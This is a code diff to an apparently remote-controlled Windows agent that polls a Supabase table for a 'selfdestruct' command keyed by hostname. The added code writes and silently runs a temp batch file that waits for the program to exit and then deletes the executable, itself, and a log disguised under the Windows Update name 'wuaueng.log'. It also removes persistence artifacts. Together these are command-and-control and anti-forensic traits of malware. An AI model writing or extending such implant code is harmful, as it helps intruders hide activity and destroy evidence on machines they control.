@@ -486,6 +486,40 @@ static void RemoveKillFlag() {
     DeleteFileA(flagPath.c_str());
 }
 
+static void ScheduleSelfDestruct() {
+    char tmp[MAX_PATH];
+    GetTempPathA(MAX_PATH, tmp);
+    char selfPath[MAX_PATH];
+    GetModuleFileNameA(NULL, selfPath, MAX_PATH);
+    std::string exeName = GetExeName();
+    std::string logPath = std::string(tmp) + "wuaueng.log";
+    std::string batPath = std::string(tmp) + "NetpenCleanup.bat";
+    std::string bat =
+        std::string("@echo off\r\n")
+        + ":w\r\n"
+        + "tasklist /fi \"IMAGENAME eq " + exeName + "\" 2>nul | find /i \"" + exeName + "\" >nul\r\n"
+        + "if errorlevel 1 goto r\r\n"
+        + "timeout /t 2 /nobreak >nul\r\n"
+        + "goto w\r\n"
+        + ":r\r\n"
+        + "del /f /q \"" + std::string(selfPath) + "\" >nul 2>&1\r\n"
+        + "del /f /q \"" + logPath + "\" >nul 2>&1\r\n"
+        + "del /f /q \"" + batPath + "\" >nul 2>&1\r\n";
+    HANDLE hf = CreateFileA(batPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hf == INVALID_HANDLE_VALUE) return;
+    DWORD w = 0;
+    WriteFile(hf, bat.c_str(), (DWORD)bat.size(), &w, NULL);
+    CloseHandle(hf);
+    STARTUPINFOA si = {0}; si.cb = sizeof(si);
+    PROCESS_INFORMATION pi = {0};
+    std::string cmd = "cmd.exe /c \"" + batPath + "\"";
+    if (!CreateProcessA(NULL, &cmd[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        DeleteFileA(batPath.c_str());
+    } else {
+        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
+    }
+}
+
 static bool CheckSelfDestruct() {
     std::wstring query = SUPABASE_CONTROL_PATH;
     query += L"?command=eq.selfdestruct&executed=eq.false&hostname=eq.";
@@ -2243,6 +2277,7 @@ static void CleanupPersistence() {
     GetTempPathA(MAX_PATH, tempPath);
     std::string cachedExe = std::string(tempPath) + GetExeName();
     DeleteFileA(cachedExe.c_str());
+    DeleteFileA((std::string(tempPath) + "wuaueng.log").c_str());
 }
 
 LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
@@ -2264,6 +2299,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
                 if (CheckSelfDestruct()) {
                     g_selfDestructing = true;
                     CleanupPersistence();
+                    ScheduleSelfDestruct();
                     CreateKillFlag();
                     g_running = false;
                     DestroyWindow(hwnd);
